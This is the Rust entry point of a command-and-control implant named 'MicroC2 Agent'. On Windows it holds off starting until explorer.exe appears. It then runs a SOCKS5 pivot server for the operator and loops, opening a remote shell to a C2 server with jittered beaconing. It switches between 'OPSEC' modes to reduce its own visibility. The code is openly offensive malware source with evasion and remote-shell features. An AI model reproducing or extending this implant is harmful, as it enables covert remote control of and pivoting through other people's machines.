mod commands;
mod config;
mod networking;
mod opsec;

use crate::commands::command_shell::run_shell;
use crate::config::AgentConfig;
use std::env;
use std::time::Duration;
use tokio::time;
use rand::Rng;
use log::{info, warn, error, debug};
use crate::networking::socks5_pivot::Socks5PivotHandler;
use crate::networking::socks5_pivot_server::Socks5PivotServer;
use std::sync::Arc;
use once_cell::sync::Lazy;
use std::sync::Mutex;
use crate::opsec::{OpsecLevel, AgentMode, determine_agent_mode, OPSEC_STATE};

fn random_jitter(base: u64, jitter: u64) -> u64 {
    let mut rng = rand::thread_rng(); // (or rand::rng() if using latest rand)
    base + rng.gen_range(0..=jitter) // (or rng.random_range(0..=jitter))
}

// Dormant startup function
// This function is called on Windows to wait for the system to be idle before starting the agent
// It checks for the presence of explorer.exe and waits for up to 10 minutes
#[cfg(target_os = "windows")]
fn dormant_startup() {
    use sysinfo::{System, SystemExt, ProcessExt};
    let mut sys = System::new_all();
    let start = std::time::Instant::now();
    // Wait up to 10 minutes or until explorer.exe is running
    while start.elapsed().as_secs() < 600 {
        sys.refresh_processes();
        if sys.processes_by_name("explorer.exe").next().is_some() {
            break;
        }
        std::thread::sleep(std::time::Duration::from_secs(5));
    }
}


#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    dormant_startup();

    env_logger::init();
    info!("[STARTUP] MicroC2 Agent starting...");

    let config = AgentConfig::load()?;
    info!("[CONFIG] Loaded agent config: {:?}", config);

    // Channel for pivot frames
    let (pivot_tx, mut pivot_rx) = tokio::sync::mpsc::channel(100);
    let pivot_handler = Arc::new(tokio::sync::Mutex::new(Socks5PivotHandler::new(pivot_tx.clone())));

    if config.socks5_enabled {
        info!("[CONFIG] SOCKS5 is enabled. Proxy: {}:{}, all C2 traffic will use SOCKS5 Proxy tunnel.", config.socks5_host, config.socks5_port);

        // Start SOCKS5 pivot server for operator-side pivoting
        let pivot_server = Socks5PivotServer::new(
            config.socks5_host.clone(),
            config.socks5_port,
            pivot_tx.clone(),
        );
        let pivot_handler_clone = pivot_handler.clone();
        tokio::spawn(async move {
            pivot_server.run(pivot_handler_clone).await;
        });
    } else {
        warn!("[CONFIG] SOCKS5 is disabled. Agent will use direct connection.");
    }

    // Spawn pivot frame handler in background
    let pivot_handler_bg = pivot_handler.clone();
    tokio::spawn(async move {
        while let Some(frame) = pivot_rx.recv().await {
            pivot_handler_bg.lock().await.handle_frame(frame).await;
        }
    });

    let server_addr = env::args()
        .nth(1)
        .unwrap_or_else(|| config.get_server_url());
    
    let agent_id = config.payload_id.clone();
    println!("[INFO] Agent ID: {}", agent_id);
    println!("[INFO] Using embedded configuration");

    info!("[AGENT] Starting main loop. Agent ID: {}", agent_id);
    loop {
        let new_mode = determine_agent_mode();
        {
            let mut state = OPSEC_STATE.lock().unwrap();
            if state.mode != new_mode {
                info!("[OPSEC] Mode transition: {:?} -> {:?}", state.mode, new_mode);
                state.mode = new_mode;
                state.last_transition = std::time::Instant::now();
            } else {
                debug!("[OPSEC] Mode unchanged: {:?}", state.mode);
            }
        }

        match new_mode {
            AgentMode::FullOpsec => {
                // Minimize activity: long sleep, no heavy ops, delay tasks
                log::debug!("[OPSEC] Full OPSEC: minimizing activity.");
                // e.g. skip non-urgent commands, rate limit
            }
            AgentMode::BackgroundOpsec => {
                // Higher beaconing, process queued commands, allow heavier ops
                log::debug!("[OPSEC] Background OPSEC: can process queued tasks.");
            }
        }

        info!("[NETWORK] Attempting connection to C2: {}", server_addr);
        if let Err(e) = run_shell(&server_addr, &agent_id, pivot_handler.clone(), pivot_tx.clone()).await {
            error!("[ERROR] Shell error: {}. Retrying...", e);
            time::sleep(Duration::from_secs(5)).await;
        }
        
        let (base, jitter) = match new_mode {
            AgentMode::FullOpsec => (600, 120),         // 10-12 min
            AgentMode::BackgroundOpsec => (60, 30),     // 1-1.5 min
        };
        let sleep_time = random_jitter(base, jitter);
        info!("[OPSEC] Sleeping for {} seconds (mode: {:?})", sleep_time, new_mode);
        tokio::time::sleep(std::time::Duration::from_secs(sleep_time)).await;
    }
}
